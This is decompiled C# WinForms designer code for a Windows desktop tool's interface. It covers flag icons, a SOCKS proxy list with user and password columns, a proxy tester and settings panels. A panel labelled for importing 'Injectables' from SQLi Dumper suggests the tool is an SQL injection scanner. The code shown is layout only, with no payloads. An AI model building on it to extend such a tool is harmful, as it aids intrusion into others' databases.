		this.imgData.Images.SetKeyName(42, "ci.png");
		this.imgData.Images.SetKeyName(43, "ck.png");
		this.imgData.Images.SetKeyName(44, "cl.png");
		this.imgData.Images.SetKeyName(45, "cm.png");
		this.imgData.Images.SetKeyName(46, "cn.png");
		this.imgData.Images.SetKeyName(47, "co.png");
		this.imgData.Images.SetKeyName(48, "cr.png");
		this.imgData.Images.SetKeyName(49, "cs.png");
		this.imgData.Images.SetKeyName(50, "cu.png");
		this.imgData.Images.SetKeyName(51, "cv.png");
		this.imgData.Images.SetKeyName(52, "cx.png");
		this.imgData.Images.SetKeyName(53, "cy.png");
		this.imgData.Images.SetKeyName(54, "cz.png");
		this.imgData.Images.SetKeyName(55, "de.png");
		this.imgData.Images.SetKeyName(56, "dj.png");
		this.imgData.Images.SetKeyName(57, "dk.png");
		this.imgData.Images.SetKeyName(58, "dm.png");
		this.imgData.Images.SetKeyName(59, "do.png");
		this.imgData.Images.SetKeyName(60, "dz.png");
		this.imgData.Images.SetKeyName(61, "ec.png");
		this.imgData.Images.SetKeyName(62, "ee.png");
		this.imgData.Images.SetKeyName(63, "eg.png");
		this.imgData.Images.SetKeyName(64, "eh.png");
		this.imgData.Images.SetKeyName(65, "england.png");
		this.imgData.Images.SetKeyName(66, "er.png");
		this.imgData.Images.SetKeyName(67, "es.png");
		this.imgData.Images.SetKeyName(68, "et.png");
		this.imgData.Images.SetKeyName(69, "europeanunion.png");
		this.imgData.Images.SetKeyName(70, "fam.png");
		this.imgData.Images.SetKeyName(71, "fi.png");
		this.imgData.Images.SetKeyName(72, "fj.png");
		this.imgData.Images.SetKeyName(73, "fk.png");
		this.imgData.Images.SetKeyName(74, "fm.png");
		this.imgData.Images.SetKeyName(75, "fo.png");
		this.imgData.Images.SetKeyName(76, "fr.png");
		this.imgData.Images.SetKeyName(77, "ga.png");
		this.imgData.Images.SetKeyName(78, "gb.png");
		this.imgData.Images.SetKeyName(79, "gd.png");
		this.imgData.Images.SetKeyName(80, "ge.png");
		this.imgData.Images.SetKeyName(81, "gf.png");
		this.imgData.Images.SetKeyName(82, "gh.png");
		this.imgData.Images.SetKeyName(83, "gi.png");
		this.imgData.Images.SetKeyName(84, "gl.png");
		this.imgData.Images.SetKeyName(85, "gm.png");
		this.imgData.Images.SetKeyName(86, "gn.png");
		this.imgData.Images.SetKeyName(87, "gp.png");
		this.imgData.Images.SetKeyName(88, "gq.png");
		this.imgData.Images.SetKeyName(89, "gr.png");
		this.imgData.Images.SetKeyName(90, "gs.png");
		this.imgData.Images.SetKeyName(91, "gt.png");
		this.imgData.Images.SetKeyName(92, "gu.png");
		this.imgData.Images.SetKeyName(93, "gw.png");
		this.imgData.Images.SetKeyName(94, "gy.png");
		this.imgData.Images.SetKeyName(95, "hk.png");
		this.imgData.Images.SetKeyName(96, "hm.png");
		this.imgData.Images.SetKeyName(97, "hn.png");
		this.imgData.Images.SetKeyName(98, "hr.png");
		this.imgData.Images.SetKeyName(99, "ht.png");
		this.imgData.Images.SetKeyName(100, "hu.png");
		this.imgData.Images.SetKeyName(101, "id.png");
		this.imgData.Images.SetKeyName(102, "ie.png");
		this.imgData.Images.SetKeyName(103, "il.png");
		this.imgData.Images.SetKeyName(104, "in.png");
		this.imgData.Images.SetKeyName(105, "io.png");
		this.imgData.Images.SetKeyName(106, "iq.png");
		this.imgData.Images.SetKeyName(107, "ir.png");
		this.imgData.Images.SetKeyName(108, "is.png");
		this.imgData.Images.SetKeyName(109, "it.png");
		this.imgData.Images.SetKeyName(110, "jm.png");
		this.imgData.Images.SetKeyName(111, "jo.png");
		this.imgData.Images.SetKeyName(112, "jp.png");
		this.imgData.Images.SetKeyName(113, "ke.png");
		this.imgData.Images.SetKeyName(114, "kg.png");
		this.imgData.Images.SetKeyName(115, "kh.png");
		this.imgData.Images.SetKeyName(116, "ki.png");
		this.imgData.Images.SetKeyName(117, "km.png");
		this.imgData.Images.SetKeyName(118, "kn.png");
		this.imgData.Images.SetKeyName(119, "kp.png");
		this.imgData.Images.SetKeyName(120, "kr.png");
		this.imgData.Images.SetKeyName(121, "kw.png");
		this.imgData.Images.SetKeyName(122, "ky.png");
		this.imgData.Images.SetKeyName(123, "kz.png");
		this.imgData.Images.SetKeyName(124, "la.png");
		this.imgData.Images.SetKeyName(125, "lb.png");
		this.imgData.Images.SetKeyName(126, "lc.png");
		this.imgData.Images.SetKeyName(127, "li.png");
		this.imgData.Images.SetKeyName(128, "lk.png");
		this.imgData.Images.SetKeyName(129, "lr.png");
		this.imgData.Images.SetKeyName(130, "ls.png");
		this.imgData.Images.SetKeyName(131, "lt.png");
		this.imgData.Images.SetKeyName(132, "lu.png");
		this.imgData.Images.SetKeyName(133, "lv.png");
		this.imgData.Images.SetKeyName(134, "ly.png");
		this.imgData.Images.SetKeyName(135, "ma.png");
		this.imgData.Images.SetKeyName(136, "mc.png");
		this.imgData.Images.SetKeyName(137, "md.png");
		this.imgData.Images.SetKeyName(138, "me.png");
		this.imgData.Images.SetKeyName(139, "mg.png");
		this.imgData.Images.SetKeyName(140, "mh.png");
		this.imgData.Images.SetKeyName(141, "mk.png");
		this.imgData.Images.SetKeyName(142, "ml.png");
		this.imgData.Images.SetKeyName(143, "mm.png");
		this.imgData.Images.SetKeyName(144, "mn.png");
		this.imgData.Images.SetKeyName(145, "mo.png");
		this.imgData.Images.SetKeyName(146, "mp.png");
		this.imgData.Images.SetKeyName(147, "mq.png");
		this.imgData.Images.SetKeyName(148, "mr.png");
		this.imgData.Images.SetKeyName(149, "ms.png");
		this.imgData.Images.SetKeyName(150, "mt.png");
		this.imgData.Images.SetKeyName(151, "mu.png");
		this.imgData.Images.SetKeyName(152, "mv.png");
		this.imgData.Images.SetKeyName(153, "mw.png");
		this.imgData.Images.SetKeyName(154, "mx.png");
		this.imgData.Images.SetKeyName(155, "my.png");
		this.imgData.Images.SetKeyName(156, "mz.png");
		this.imgData.Images.SetKeyName(157, "na.png");
		this.imgData.Images.SetKeyName(158, "nc.png");
		this.imgData.Images.SetKeyName(159, "ne.png");
		this.imgData.Images.SetKeyName(160, "nf.png");
		this.imgData.Images.SetKeyName(161, "ng.png");
		this.imgData.Images.SetKeyName(162, "ni.png");
		this.imgData.Images.SetKeyName(163, "nl.png");
		this.imgData.Images.SetKeyName(164, "no.png");
		this.imgData.Images.SetKeyName(165, "np.png");
		this.imgData.Images.SetKeyName(166, "nr.png");
		this.imgData.Images.SetKeyName(167, "nu.png");
		this.imgData.Images.SetKeyName(168, "nz.png");
		this.imgData.Images.SetKeyName(169, "om.png");
		this.imgData.Images.SetKeyName(170, "pa.png");
		this.imgData.Images.SetKeyName(171, "pe.png");
		this.imgData.Images.SetKeyName(172, "pf.png");
		this.imgData.Images.SetKeyName(173, "pg.png");
		this.imgData.Images.SetKeyName(174, "ph.png");
		this.imgData.Images.SetKeyName(175, "pk.png");
		this.imgData.Images.SetKeyName(176, "pl.png");
		this.imgData.Images.SetKeyName(177, "pm.png");
		this.imgData.Images.SetKeyName(178, "pn.png");
		this.imgData.Images.SetKeyName(179, "pr.png");
		this.imgData.Images.SetKeyName(180, "ps.png");
		this.imgData.Images.SetKeyName(181, "pt.png");
		this.imgData.Images.SetKeyName(182, "pw.png");
		this.imgData.Images.SetKeyName(183, "py.png");
		this.imgData.Images.SetKeyName(184, "qa.png");
		this.imgData.Images.SetKeyName(185, "re.png");
		this.imgData.Images.SetKeyName(186, "ro.png");
		this.imgData.Images.SetKeyName(187, "rs.png");
		this.imgData.Images.SetKeyName(188, "ru.png");
		this.imgData.Images.SetKeyName(189, "rw.png");
		this.imgData.Images.SetKeyName(190, "sa.png");
		this.imgData.Images.SetKeyName(191, "sb.png");
		this.imgData.Images.SetKeyName(192, "sc.png");
		this.imgData.Images.SetKeyName(193, "scotland.png");
		this.imgData.Images.SetKeyName(194, "sd.png");
		this.imgData.Images.SetKeyName(195, "se.png");
		this.imgData.Images.SetKeyName(196, "sg.png");
		this.imgData.Images.SetKeyName(197, "sh.png");
		this.imgData.Images.SetKeyName(198, "si.png");
		this.imgData.Images.SetKeyName(199, "sj.png");
		this.imgData.Images.SetKeyName(200, "sk.png");
		this.imgData.Images.SetKeyName(201, "sl.png");
		this.imgData.Images.SetKeyName(202, "sm.png");
		this.imgData.Images.SetKeyName(203, "sn.png");
		this.imgData.Images.SetKeyName(204, "so.png");
		this.imgData.Images.SetKeyName(205, "sr.png");
		this.imgData.Images.SetKeyName(206, "st.png");
		this.imgData.Images.SetKeyName(207, "sv.png");
		this.imgData.Images.SetKeyName(208, "sy.png");
		this.imgData.Images.SetKeyName(209, "sz.png");
		this.imgData.Images.SetKeyName(210, "tc.png");
		this.imgData.Images.SetKeyName(211, "td.png");
		this.imgData.Images.SetKeyName(212, "tf.png");
		this.imgData.Images.SetKeyName(213, "tg.png");
		this.imgData.Images.SetKeyName(214, "th.png");
		this.imgData.Images.SetKeyName(215, "tj.png");
		this.imgData.Images.SetKeyName(216, "tk.png");
		this.imgData.Images.SetKeyName(217, "tl.png");
		this.imgData.Images.SetKeyName(218, "tm.png");
		this.imgData.Images.SetKeyName(219, "tn.png");
		this.imgData.Images.SetKeyName(220, "to.png");
		this.imgData.Images.SetKeyName(221, "tr.png");
		this.imgData.Images.SetKeyName(222, "tt.png");
		this.imgData.Images.SetKeyName(223, "tv.png");
		this.imgData.Images.SetKeyName(224, "tw.png");
		this.imgData.Images.SetKeyName(225, "tz.png");
		this.imgData.Images.SetKeyName(226, "ua.png");
		this.imgData.Images.SetKeyName(227, "ug.png");
		this.imgData.Images.SetKeyName(228, "um.png");
		this.imgData.Images.SetKeyName(229, "us.png");
		this.imgData.Images.SetKeyName(230, "uy.png");
		this.imgData.Images.SetKeyName(231, "uz.png");
		this.imgData.Images.SetKeyName(232, "va.png");
		this.imgData.Images.SetKeyName(233, "vc.png");
		this.imgData.Images.SetKeyName(234, "ve.png");
		this.imgData.Images.SetKeyName(235, "vg.png");
		this.imgData.Images.SetKeyName(236, "vi.png");
		this.imgData.Images.SetKeyName(237, "vn.png");
		this.imgData.Images.SetKeyName(238, "vu.png");
		this.imgData.Images.SetKeyName(239, "wales.png");
		this.imgData.Images.SetKeyName(240, "wf.png");
		this.imgData.Images.SetKeyName(241, "ws.png");
		this.imgData.Images.SetKeyName(242, "ye.png");
		this.imgData.Images.SetKeyName(243, "yt.png");
		this.imgData.Images.SetKeyName(244, "za.png");
		this.imgData.Images.SetKeyName(245, "zm.png");
		this.imgData.Images.SetKeyName(246, "zw.png");
		this.imgData.Images.SetKeyName(247, "--.png");
		this.mnuSocks.ImageScalingSize = new Size(24, 24);
		this.mnuSocks.Items.AddRange(new ToolStripItem[]
		{
			this.mnuSocksCheck,
			this.mnuSocksUnCheck,
			this.ToolStripMenuItem5,
			this.mnuSocksSelectAll,
			this.mnuSocksRemove
		});
		this.mnuSocks.Name = "mnuChecked";
		this.mnuSocks.ShowImageMargin = false;
		this.mnuSocks.ShowItemToolTips = false;
		this.mnuSocks.Size = new Size(154, 130);
		this.mnuSocksCheck.Name = "mnuSocksCheck";
		this.mnuSocksCheck.Size = new Size(153, 30);
		this.mnuSocksCheck.Text = "Check All";
		this.mnuSocksUnCheck.Name = "mnuSocksUnCheck";
		this.mnuSocksUnCheck.Size = new Size(153, 30);
		this.mnuSocksUnCheck.Text = "UnCheck All";
		this.ToolStripMenuItem5.Name = "ToolStripMenuItem5";
		this.ToolStripMenuItem5.Size = new Size(150, 6);
		this.mnuSocksSelectAll.Name = "mnuSocksSelectAll";
		this.mnuSocksSelectAll.Size = new Size(153, 30);
		this.mnuSocksSelectAll.Text = "Select All";
		this.mnuSocksRemove.Name = "mnuSocksRemove";
		this.mnuSocksRemove.Size = new Size(153, 30);
		this.mnuSocksRemove.Text = "Remove";
		this.pnlAbout.BackColor = Color.Black;
		this.pnlAbout.Location = new Point(2248, 698);
		this.pnlAbout.Margin = new Padding(4, 5, 4, 5);
		this.pnlAbout.Name = "pnlAbout";
		this.pnlAbout.Size = new Size(90, 60);
		this.pnlAbout.TabIndex = 22;
		this.pnlAbout.Visible = false;
		this.pnlSockList.AutoScroll = true;
		this.pnlSockList.Controls.Add(this.dtgSocks);
		this.pnlSockList.Controls.Add(this.tsSocks);
		this.pnlSockList.Location = new Point(267, 414);
		this.pnlSockList.Margin = new Padding(4, 5, 4, 5);
		this.pnlSockList.Name = "pnlSockList";
		this.pnlSockList.Size = new Size(619, 97);
		this.pnlSockList.TabIndex = 23;
		this.pnlSockList.Visible = false;
		this.dtgSocks.AllowUserToAddRows = false;
		this.dtgSocks.AllowUserToDeleteRows = false;
		this.dtgSocks.AllowUserToResizeRows = false;
		this.dtgSocks.BackgroundColor = SystemColors.Window;
		this.dtgSocks.BorderStyle = BorderStyle.Fixed3D;
		this.dtgSocks.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgSocks.Columns.AddRange(new DataGridViewColumn[]
		{
			this.Column14,
			this.DataGridViewImageColumn3,
			this.DataGridViewTextBoxColumn10,
			this.DataGridViewTextBoxColumn11,
			this.DataGridViewTextBoxColumn12,
			this.Column5,
			this.Column15
		});
		this.dtgSocks.ContextMenuStrip = this.mnuSocks;
		this.dtgSocks.Dock = DockStyle.Fill;
		this.dtgSocks.Location = new Point(0, 32);
		this.dtgSocks.Name = "dtgSocks";
		this.dtgSocks.RowHeadersVisible = false;
		this.dtgSocks.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		this.dtgSocks.ShowCellErrors = false;
		this.dtgSocks.ShowEditingIcon = false;
		this.dtgSocks.ShowRowErrors = false;
		this.dtgSocks.Size = new Size(619, 65);
		this.dtgSocks.TabIndex = 40;
		this.Column14.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
		dataGridViewCellStyle.Alignment = DataGridViewContentAlignment.MiddleRight;
		dataGridViewCellStyle.NullValue = false;
		this.Column14.DefaultCellStyle = dataGridViewCellStyle;
		this.Column14.HeaderText = "";
		this.Column14.MinimumWidth = 20;
		this.Column14.Name = "Column14";
		this.Column14.Resizable = DataGridViewTriState.False;
		this.Column14.Width = 20;
		this.DataGridViewImageColumn3.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewImageColumn3.HeaderText = "";
		this.DataGridViewImageColumn3.Name = "DataGridViewImageColumn3";
		this.DataGridViewImageColumn3.ReadOnly = true;
		this.DataGridViewImageColumn3.Resizable = DataGridViewTriState.False;
		this.DataGridViewImageColumn3.Width = 5;
		this.DataGridViewTextBoxColumn10.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn10.HeaderText = "IP";
		this.DataGridViewTextBoxColumn10.Name = "DataGridViewTextBoxColumn10";
		this.DataGridViewTextBoxColumn10.ReadOnly = true;
		this.DataGridViewTextBoxColumn10.Resizable = DataGridViewTriState.False;
		this.DataGridViewTextBoxColumn10.Width = 60;
		this.DataGridViewTextBoxColumn11.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn11.HeaderText = "Type";
		this.DataGridViewTextBoxColumn11.Name = "DataGridViewTextBoxColumn11";
		this.DataGridViewTextBoxColumn11.ReadOnly = true;
		this.DataGridViewTextBoxColumn11.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn11.Width = 79;
		this.DataGridViewTextBoxColumn12.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn12.HeaderText = "User";
		this.DataGridViewTextBoxColumn12.Name = "DataGridViewTextBoxColumn12";
		this.DataGridViewTextBoxColumn12.ReadOnly = true;
		this.DataGridViewTextBoxColumn12.Resizable = DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn12.Width = 79;
		this.Column5.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.Column5.HeaderText = "Password";
		this.Column5.Name = "Column5";
		this.Column5.ReadOnly = true;
		this.Column5.Width = 114;
		this.Column15.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells;
		this.Column15.HeaderText = "Country";
		this.Column15.Name = "Column15";
		this.Column15.ReadOnly = true;
		this.tsSocks.GripStyle = ToolStripGripStyle.Hidden;
		this.tsSocks.ImageScalingSize = new Size(24, 24);
		this.tsSocks.Items.AddRange(new ToolStripItem[]
		{
			this.lblSocksCount,
			this.btnSocksClear,
			this.ToolStripSeparator15,
			this.btnSocksUrl,
			this.ToolStripSeparator16,
			this.btnSocksAppend,
			this.ToolStripSeparator17,
			this.btnSocksNew,
			this.ToolStripSeparator14,
			this.btnSocksMyIP,
			this.ToolStripLabel9,
			this.btnSocksTest
		});
		this.tsSocks.Location = new Point(0, 0);
		this.tsSocks.Name = "tsSocks";
		this.tsSocks.Padding = new Padding(0, 0, 2, 0);
		this.tsSocks.RenderMode = ToolStripRenderMode.System;
		this.tsSocks.Size = new Size(619, 32);
		this.tsSocks.TabIndex = 27;
		this.lblSocksCount.Alignment = ToolStripItemAlignment.Right;
		this.lblSocksCount.Name = "lblSocksCount";
		this.lblSocksCount.Size = new Size(125, 29);
		this.lblSocksCount.Text = "lblSocksCount";
		this.btnSocksClear.DisplayStyle = ToolStripItemDisplayStyle.Image;
		this.btnSocksClear.Image = Class6.delete;
		this.btnSocksClear.ImageTransparentColor = Color.Magenta;
		this.btnSocksClear.Name = "btnSocksClear";
		this.btnSocksClear.Size = new Size(28, 29);
		this.btnSocksClear.Text = "&Clear";
		this.ToolStripSeparator15.Name = "ToolStripSeparator15";
		this.ToolStripSeparator15.Size = new Size(6, 32);
		this.btnSocksUrl.DisplayStyle = ToolStripItemDisplayStyle.Image;
		this.btnSocksUrl.Image = Class6.RunUpdate_16x_24;
		this.btnSocksUrl.ImageTransparentColor = Color.Magenta;
		this.btnSocksUrl.Name = "btnSocksUrl";
		this.btnSocksUrl.Size = new Size(28, 29);
		this.btnSocksUrl.Text = "URL";
		this.ToolStripSeparator16.Name = "ToolStripSeparator16";
		this.ToolStripSeparator16.Size = new Size(6, 32);
		this.btnSocksAppend.DisplayStyle = ToolStripItemDisplayStyle.Image;
		this.btnSocksAppend.Image = Class6.clipboard_16xLG;
		this.btnSocksAppend.ImageTransparentColor = Color.Magenta;
		this.btnSocksAppend.Name = "btnSocksAppend";
		this.btnSocksAppend.Size = new Size(28, 29);
		this.btnSocksAppend.Text = "&Apprend";
		this.ToolStripSeparator17.Name = "ToolStripSeparator17";
		this.ToolStripSeparator17.Size = new Size(6, 32);
		this.btnSocksNew.DisplayStyle = ToolStripItemDisplayStyle.Image;
		this.btnSocksNew.Image = Class6.AddToCollection_ActionGray_16x_24;
		this.btnSocksNew.ImageTransparentColor = Color.Magenta;
		this.btnSocksNew.Name = "btnSocksNew";
		this.btnSocksNew.Size = new Size(28, 29);
		this.btnSocksNew.Text = "&Add";
		this.ToolStripSeparator14.Name = "ToolStripSeparator14";
		this.ToolStripSeparator14.Size = new Size(6, 32);
		this.btnSocksMyIP.CheckOnClick = true;
		this.btnSocksMyIP.DisplayStyle = ToolStripItemDisplayStyle.Image;
		this.btnSocksMyIP.Image = Class6.IPAddressControl_16x_24;
		this.btnSocksMyIP.ImageTransparentColor = Color.Magenta;
		this.btnSocksMyIP.Name = "btnSocksMyIP";
		this.btnSocksMyIP.Size = new Size(28, 29);
		this.btnSocksMyIP.Text = "&Include MyIP";
		this.ToolStripLabel9.Alignment = ToolStripItemAlignment.Right;
		this.ToolStripLabel9.DisplayStyle = ToolStripItemDisplayStyle.Text;
		this.ToolStripLabel9.Name = "ToolStripLabel9";
		this.ToolStripLabel9.RightToLeftAutoMirrorImage = true;
		this.ToolStripLabel9.Size = new Size(0, 29);
		this.btnSocksTest.Alignment = ToolStripItemAlignment.Right;
		this.btnSocksTest.Image = Class6.RunThread_16x_24;
		this.btnSocksTest.ImageTransparentColor = Color.Magenta;
		this.btnSocksTest.Name = "btnSocksTest";
		this.btnSocksTest.Size = new Size(139, 29);
		this.btnSocksTest.Text = "&Test Proxies..";
		this.pnlSettings.AutoScroll = true;
		this.pnlSettings.Controls.Add(this.GroupBox2);
		this.pnlSettings.Controls.Add(this.grbUpdater);
		this.pnlSettings.Controls.Add(this.grbAppSetthings);
		this.pnlSettings.Controls.Add(this.GroupBox4);
		this.pnlSettings.Controls.Add(this.grbExploithing);
		this.pnlSettings.Controls.Add(this.GroupBox1);
		this.pnlSettings.Location = new Point(1525, 18);
		this.pnlSettings.Margin = new Padding(4, 5, 4, 5);
		this.pnlSettings.Name = "pnlSettings";
		this.pnlSettings.Size = new Size(612, 904);
		this.pnlSettings.TabIndex = 4;
		this.pnlSettings.Visible = false;
		this.GroupBox2.Controls.Add(this.prbImport);
		this.GroupBox2.Controls.Add(this.btnXmlImport8x);
		this.GroupBox2.Location = new Point(3, 655);
		this.GroupBox2.Margin = new Padding(4, 5, 4, 5);
		this.GroupBox2.Name = "GroupBox2";
		this.GroupBox2.Padding = new Padding(4, 5, 4, 5);
		this.GroupBox2.Size = new Size(579, 68);
		this.GroupBox2.TabIndex = 7;
		this.GroupBox2.TabStop = false;
		this.GroupBox2.Text = "Import Injectables from SQLi Dumper 8.x";
		this.GroupBox2.Visible = false;
		this.prbImport.Location = new Point(69, 28);
		this.prbImport.Name = "prbImport";
		this.prbImport.Size = new Size(296, 23);
		this.prbImport.TabIndex = 3;
		this.btnXmlImport8x.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.btnXmlImport8x.Location = new Point(372, 23);
		this.btnXmlImport8x.Margin = new Padding(4, 5, 4, 5);
		this.btnXmlImport8x.Name = "btnXmlImport8x";
		this.btnXmlImport8x.Size = new Size(148, 30);
		this.btnXmlImport8x.TabIndex = 2;
		this.btnXmlImport8x.Text = "Import..";
		this.btnXmlImport8x.UseVisualStyleBackColor = true;
		this.grbUpdater.Controls.Add(this.cmbUpdater);
		this.grbUpdater.Controls.Add(this.chkUpdater);
		this.grbUpdater.Controls.Add(this.btnUpdater);
		this.grbUpdater.Location = new Point(3, 739);
		this.grbUpdater.Margin = new Padding(4, 5, 4, 5);
		this.grbUpdater.Name = "grbUpdater";
		this.grbUpdater.Padding = new Padding(4, 5, 4, 5);
		this.grbUpdater.Size = new Size(579, 68);
		this.grbUpdater.TabIndex = 5;
		this.grbUpdater.TabStop = false;
		this.grbUpdater.Text = "APP Update";
		this.grbUpdater.Visible = false;
		this.cmbUpdater.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.cmbUpdater.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbUpdater.Enabled = false;
		this.cmbUpdater.FlatStyle = FlatStyle.System;
		this.cmbUpdater.FormattingEnabled = true;
		this.cmbUpdater.Location = new Point(222, 26);
		this.cmbUpdater.Margin = new Padding(4, 5, 4, 5);
		this.cmbUpdater.Name = "cmbUpdater";
		this.cmbUpdater.Size = new Size(144, 28);
		this.cmbUpdater.TabIndex = 7;
		this.chkUpdater.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.chkUpdater.CheckAlign = ContentAlignment.MiddleRight;
		this.chkUpdater.ForeColor = SystemColors.ControlText;
		this.chkUpdater.Location = new Point(8, 25);
		this.chkUpdater.Margin = new Padding(4, 5, 4, 5);
		this.chkUpdater.Name = "chkUpdater";
		this.chkUpdater.Size = new Size(208, 32);
		this.chkUpdater.TabIndex = 6;
		this.chkUpdater.Text = "Check frequency ";
		this.chkUpdater.TextAlign = ContentAlignment.MiddleRight;
		this.chkUpdater.UseVisualStyleBackColor = true;
		this.btnUpdater.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.btnUpdater.Location = new Point(372, 26);
		this.btnUpdater.Margin = new Padding(4, 5, 4, 5);
		this.btnUpdater.Name = "btnUpdater";
		this.btnUpdater.Size = new Size(148, 30);
		this.btnUpdater.TabIndex = 0;
		this.btnUpdater.Text = "Check";
		this.btnUpdater.UseVisualStyleBackColor = true;
		this.grbAppSetthings.Controls.Add(this.btnSettingSave);
		this.grbAppSetthings.Controls.Add(this.btnSettingReLoad);
		this.grbAppSetthings.Controls.Add(this.btnSettingReset);
		this.grbAppSetthings.Location = new Point(3, 515);
		this.grbAppSetthings.Margin = new Padding(4, 5, 4, 5);
		this.grbAppSetthings.Name = "grbAppSetthings";
		this.grbAppSetthings.Padding = new Padding(4, 5, 4, 5);
		this.grbAppSetthings.Size = new Size(579, 68);
		this.grbAppSetthings.TabIndex = 4;
		this.grbAppSetthings.TabStop = false;
		this.grbAppSetthings.Text = "Settings";
		this.btnSettingSave.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.btnSettingSave.Location = new Point(69, 23);
		this.btnSettingSave.Margin = new Padding(4, 5, 4, 5);
		this.btnSettingSave.Name = "btnSettingSave";
		this.btnSettingSave.Size = new Size(148, 30);
		this.btnSettingSave.TabIndex = 0;
		this.btnSettingSave.Text = "Save";
		this.btnSettingSave.UseVisualStyleBackColor = true;
		this.btnSettingReLoad.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.btnSettingReLoad.Location = new Point(219, 23);
		this.btnSettingReLoad.Margin = new Padding(4, 5, 4, 5);
		this.btnSettingReLoad.Name = "btnSettingReLoad";
		this.btnSettingReLoad.Size = new Size(148, 30);
		this.btnSettingReLoad.TabIndex = 1;
		this.btnSettingReLoad.Text = "ReLoaded";
		this.btnSettingReLoad.UseVisualStyleBackColor = true;
		this.btnSettingReset.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.btnSettingReset.Location = new Point(372, 23);
		this.btnSettingReset.Margin = new Padding(4, 5, 4, 5);
		this.btnSettingReset.Name = "btnSettingReset";
		this.btnSettingReset.Size = new Size(148, 30);
		this.btnSettingReset.TabIndex = 2;
		this.btnSettingReset.Text = "Reset All";
		this.btnSettingReset.UseVisualStyleBackColor = true;
		this.GroupBox4.Controls.Add(this.lblGuiStyle);
		this.GroupBox4.Controls.Add(this.cmbGuiStyle);
		this.GroupBox4.Controls.Add(this.lblLanguage);
		this.GroupBox4.Controls.Add(this.cmbLanguages);
		this.GroupBox4.Controls.Add(this.cmbGUIHotKey);
		this.GroupBox4.Controls.Add(this.btnSkinN);
		this.GroupBox4.Controls.Add(this.btnSkinP);
		this.GroupBox4.Controls.Add(this.cmbSkin);
		this.GroupBox4.Controls.Add(this.chkSkin);
		this.GroupBox4.Controls.Add(this.chkGUIHotKey);
		this.GroupBox4.Controls.Add(this.chkSysTray);
		this.GroupBox4.Location = new Point(3, 353);
		this.GroupBox4.Name = "GroupBox4";
		this.GroupBox4.Size = new Size(579, 165);
		this.GroupBox4.TabIndex = 3;
		this.GroupBox4.TabStop = false;
		this.GroupBox4.Text = "GUI Skin";
		this.lblGuiStyle.Location = new Point(8, 94);
		this.lblGuiStyle.Margin = new Padding(4, 0, 4, 0);
		this.lblGuiStyle.Name = "lblGuiStyle";
		this.lblGuiStyle.Size = new Size(202, 26);
		this.lblGuiStyle.TabIndex = 36;
		this.lblGuiStyle.Text = "GUI Style";
		this.lblGuiStyle.TextAlign = ContentAlignment.MiddleLeft;
		this.cmbGuiStyle.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.cmbGuiStyle.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbGuiStyle.FormattingEnabled = true;
		this.cmbGuiStyle.Location = new Point(8, 124);
		this.cmbGuiStyle.Margin = new Padding(4, 5, 4, 5);
		this.cmbGuiStyle.Name = "cmbGuiStyle";
		this.cmbGuiStyle.Size = new Size(204, 28);
		this.cmbGuiStyle.TabIndex = 35;
		this.lblLanguage.Location = new Point(8, 28);
		this.lblLanguage.Margin = new Padding(4, 0, 4, 0);
		this.lblLanguage.Name = "lblLanguage";
		this.lblLanguage.Size = new Size(202, 26);
		this.lblLanguage.TabIndex = 34;
		this.lblLanguage.Text = "Language";
		this.lblLanguage.TextAlign = ContentAlignment.MiddleLeft;
		this.cmbLanguages.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.cmbLanguages.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbLanguages.FormattingEnabled = true;
		this.cmbLanguages.Location = new Point(8, 58);
		this.cmbLanguages.Margin = new Padding(4, 5, 4, 5);
		this.cmbLanguages.Name = "cmbLanguages";
		this.cmbLanguages.Size = new Size(204, 28);
		this.cmbLanguages.TabIndex = 7;
		this.cmbGUIHotKey.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.cmbGUIHotKey.Enabled = false;
		this.cmbGUIHotKey.FormattingEnabled = true;
		this.cmbGUIHotKey.Location = new Point(498, 124);
		this.cmbGUIHotKey.Margin = new Padding(4, 5, 4, 5);
		this.cmbGUIHotKey.Name = "cmbGUIHotKey";
		this.cmbGUIHotKey.Size = new Size(70, 28);
		this.cmbGUIHotKey.TabIndex = 5;
		this.btnSkinN.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.btnSkinN.Font = new Font("Microsoft Sans Serif", 6f, FontStyle.Bold, GraphicsUnit.Point, 0);
		this.btnSkinN.Location = new Point(498, 58);
		this.btnSkinN.Margin = new Padding(4, 5, 4, 5);
		this.btnSkinN.Name = "btnSkinN";
		this.btnSkinN.Size = new Size(70, 30);
		this.btnSkinN.TabIndex = 2;
		this.btnSkinN.Text = ">>";
		this.btnSkinN.UseVisualStyleBackColor = true;
		this.btnSkinP.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
		this.btnSkinP.Enabled = false;
		this.btnSkinP.Font = new Font("Microsoft Sans Serif", 6f, FontStyle.Bold, GraphicsUnit.Point, 0);
